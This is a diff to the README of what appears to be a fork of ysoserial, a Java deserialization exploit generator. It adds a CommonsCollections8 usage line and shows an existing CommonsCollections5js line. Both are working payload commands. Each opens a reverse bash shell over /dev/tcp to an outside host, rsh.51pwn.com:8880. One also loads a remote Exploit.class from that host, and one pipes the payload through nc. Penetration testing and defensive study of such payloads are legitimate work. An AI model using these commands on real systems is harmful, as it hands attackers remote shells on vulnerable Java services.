@@ -10,6 +10,10 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 ![logo](ysoserial.png)
 
 # New Features
+- add **CommonsCollections8**
+```
+java -jar $mtx/../tools/ysoserial-all.jar CommonsCollections8 'https://rsh.51pwn.comExploit.class' 'exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1'
+```
 - add CommonsCollections5js support "js code",ByPass java8 "java.lang.Override missing element entrySet"
 ```
 java -jar $mtx/../tools/ysoserial-all.jar CommonsCollections5js "var x=new java.lang.ProcessBuilder(\"bash\",\"-c\",\"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1\");x.start().getInputStream();"|nc 127.0.0.1 4712
